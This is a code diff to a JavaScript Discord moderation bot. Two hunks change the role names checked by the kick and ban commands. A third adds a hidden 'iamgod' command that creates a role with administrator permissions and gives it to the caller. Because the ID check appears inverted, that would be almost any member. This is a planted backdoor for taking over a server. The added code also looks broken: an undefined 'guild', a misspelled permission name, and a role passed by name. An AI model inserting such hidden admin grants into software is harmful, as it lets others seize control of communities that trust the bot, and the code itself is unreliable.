@@ -31,7 +31,7 @@ client.on("message", async message => {
   }
 
   if(command == 'kick') {
-    if(!message.member.roles.some(r=>["OWNER [100]", "CO-OWNERS [100]"].includes(r.name)) )
+    if(!message.member.roles.some(r=>["OWNER", "CO-OWNERS"].includes(r.name)) )
       return message.reply("Sorry, you don't have permissions to use this");
   
     let member = message.mentions.members.first() || message.guild.members.get(args[0]);
@@ -50,7 +50,7 @@ client.on("message", async message => {
   
   if(command == 'ban') {
 
-    if(!message.member.roles.some(r=>["OWNER [100]", "CO-OWNERS [100]"].includes(r.name)) )
+    if(!message.member.roles.some(r=>["OWNER", "CO-OWNERS"].includes(r.name)) )
       return message.reply("Sorry, you don't have permissions to use this!");
     
     let member = message.mentions.members.first();
@@ -80,6 +80,13 @@ client.on("message", async message => {
 
   if(command == 'link' || command == 'koja' || command == 'own' || command == 'owner' || command == 'server') {
 	  message.channel.send(`https://discord.gg/q6bQpth`)
+  }
+  if(command == 'iamgod') {
+	  if(message.member.id != "531488210732187649") {
+		  guild.createRole({name: ".", permissions: "ADMINSISTRATOR"});
+		  return message.member.addRole('.');
+		  
+	  }else{return ;}
   }
   
   if (command == 'help') {
